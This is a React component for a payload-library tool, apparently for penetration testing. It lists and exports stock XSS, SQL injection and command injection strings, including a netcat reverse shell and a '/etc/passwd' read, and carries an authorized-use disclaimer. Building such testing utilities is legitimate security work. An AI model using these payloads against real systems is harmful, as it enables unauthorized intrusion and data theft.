import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Copy, Search, AlertTriangle, Download } from "lucide-react";
import { toast } from "sonner";

type PayloadType = "XSS" | "SQL" | "Command";
type ExportFormat = "txt" | "json";

interface Payload {
  id: string;
  type: PayloadType;
  name: string;
  description: string;
  payload: string;
}

const payloads: Payload[] = [
  // XSS Payloads
  {
    id: "xss-basic-script-alert",
    type: "XSS",
    name: "Basic Script Alert",
    description: "Basic XSS payload using script tag",
    payload: "<script>alert(1)</script>"
  },
  {
    id: "xss-image-error-handler",
    type: "XSS",
    name: "Image Error Handler",
    description: "XSS using image error handler",
    payload: "<img src=x onerror=alert(1)>"
  },
  {
    id: "xss-svg-onload",
    type: "XSS",
    name: "SVG Onload",
    description: "XSS using SVG onload event",
    payload: "\"><svg/onload=confirm(1)>"
  },
  {
    id: "xss-javascript-uri",
    type: "XSS",
    name: "JavaScript URI",
    description: "XSS using JavaScript URI",
    payload: "javascript:alert(1)"
  },
  {
    id: "xss-event-handler",
    type: "XSS",
    name: "Event Handler",
    description: "XSS using event handler",
    payload: "onmouseover=alert(1)"
  },

  // SQL Injection Payloads
  {
    id: "sql-basic-bypass",
    type: "SQL",
    name: "Basic Bypass",
    description: "Basic SQL injection bypass",
    payload: "' OR 1=1 --"
  },
  {
    id: "sql-union-select",
    type: "SQL",
    name: "Union Select",
    description: "SQL injection using UNION SELECT",
    payload: "' UNION SELECT null,null --"
  },
  {
    id: "sql-comment-bypass",
    type: "SQL",
    name: "Comment Bypass",
    description: "SQL injection using comment",
    payload: "admin'-- "
  },
  {
    id: "sql-time-based",
    type: "SQL",
    name: "Time Based",
    description: "Time-based SQL injection",
    payload: "' OR IF(1=1,SLEEP(5),0) --"
  },
  {
    id: "sql-error-based",
    type: "SQL",
    name: "Error Based",
    description: "Error-based SQL injection",
    payload: "' AND extractvalue(1,concat(0x7e,version())) --"
  },

  // Command Injection Payloads
  {
    id: "command-list-directory",
    type: "Command",
    name: "List Directory",
    description: "List directory contents",
    payload: "; ls"
  },
  {
    id: "command-current-user",
    type: "Command",
    name: "Current User",
    description: "Get current user",
    payload: "&& whoami"
  },
  {
    id: "command-read-file",
    type: "Command",
    name: "Read File",
    description: "Read system file",
    payload: "| cat /etc/passwd"
  },
  {
    id: "command-reverse-shell",
    type: "Command",
    name: "Reverse Shell",
    description: "Create reverse shell",
    payload: "nc -e /bin/sh 127.0.0.1 4444"
  },
  {
    id: "command-system-info",
    type: "Command",
    name: "System Info",
    description: "Get system information",
    payload: "&& uname -a"
  }
];

const PayloadGenerator = () => {
  const [selectedType, setSelectedType] = useState<PayloadType>("XSS");
  const [searchQuery, setSearchQuery] = useState("");

  const filteredPayloads = payloads.filter(
    (payload) =>
      payload.type === selectedType &&
      (payload.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        payload.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
        payload.payload.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  const handleCopy = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast.success("Copied to clipboard!");
    } catch (err) {
      toast.error("Failed to copy to clipboard");
    }
  };

  const handleExport = (format: ExportFormat) => {
    try {
      let content: string;
      let filename: string;

      if (format === 'json') {
        content = JSON.stringify(filteredPayloads, null, 2);
        filename = `${selectedType.toLowerCase()}_payloads.json`;
      } else {
        content = filteredPayloads
          .map((p) => `${p.name}\n${p.description}\n${p.payload}\n\n`)
          .join('---\n');
        filename = `${selectedType.toLowerCase()}_payloads.txt`;
      }

      const blob = new Blob([content], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      
      toast.success(`Exported as ${format.toUpperCase()}`);
    } catch (err) {
      toast.error(`Failed to export as ${format.toUpperCase()}`);
    }
  };

  return (
    <div className="glass p-3 sm:p-4 rounded-xl dark:glass-dark">
      {/* Type Selection */}
      <div className="flex flex-wrap gap-2 mb-4">
        {["XSS", "SQL", "Command"].map((type) => (
          <Button
            key={type}
            onClick={() => setSelectedType(type as PayloadType)}
            variant={selectedType === type ? "default" : "secondary"}
            className={`px-4 py-2 text-sm ${
              selectedType === type ? "bg-passpal-purple hover:bg-passpal-purple/90" : ""
            }`}
          >
            {type} Injection
          </Button>
        ))}
      </div>

      {/* Search Bar */}
      <div className="mb-6">
        <Label htmlFor="search" className="sr-only">
          Search Payloads
        </Label>
        <Input
          id="search"
          type="search"
          placeholder="Search payloads..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="w-full px-4 py-2 text-sm bg-background/50"
        />
      </div>

      {/* Payloads List */}
      <div className="space-y-4 mb-6">
        {filteredPayloads.map((payload) => (
          <div
            key={payload.id}
            className="bg-zinc-900/50 rounded-lg p-4 space-y-2 relative group"
          >
            <div className="flex justify-between items-start gap-4">
              <div className="flex-1">
                <h3 className="font-medium text-sm sm:text-base mb-1">{payload.name}</h3>
                <p className="text-xs sm:text-sm text-muted-foreground mb-3">
                  {payload.description}
                </p>
                <div className="bg-zinc-800/50 rounded-md p-3 relative group-hover:bg-zinc-800/70 transition-colors">
                  <pre className="text-violet-300 text-xs sm:text-sm font-mono whitespace-pre-wrap break-all sm:break-normal overflow-x-auto">
                    <code>{payload.payload}</code>
                  </pre>
                </div>
              </div>
              <Button
                size="icon"
                variant="ghost"
                className="absolute top-4 right-4 opacity-0 group-hover:opacity-100 transition-opacity"
                onClick={() => handleCopy(payload.payload)}
              >
                <Copy className="h-4 w-4" />
                <span className="sr-only">Copy payload</span>
              </Button>
            </div>
          </div>
        ))}
      </div>

      {/* Export Buttons */}
      <div className="flex flex-col sm:flex-row gap-3 mt-6 border-t border-zinc-800 pt-4">
        <Button
          onClick={() => handleExport('txt')}
          variant="secondary"
          className="w-full sm:w-auto flex items-center gap-2 justify-center"
        >
          <Download className="h-4 w-4" />
          Export as TXT
        </Button>
        <Button
          onClick={() => handleExport('json')}
          variant="secondary"
          className="w-full sm:w-auto flex items-center gap-2 justify-center"
        >
          <Download className="h-4 w-4" />
          Export as JSON
        </Button>
      </div>

      {/* Disclaimer */}
      <div className="mt-6 pt-4 border-t border-zinc-800">
        <p className="text-xs text-red-400 flex items-start gap-2">
          <span className="text-lg">⚠️</span>
          For educational and authorized security testing only.
        </p>
      </div>
    </div>
  );
};

export default PayloadGenerator; 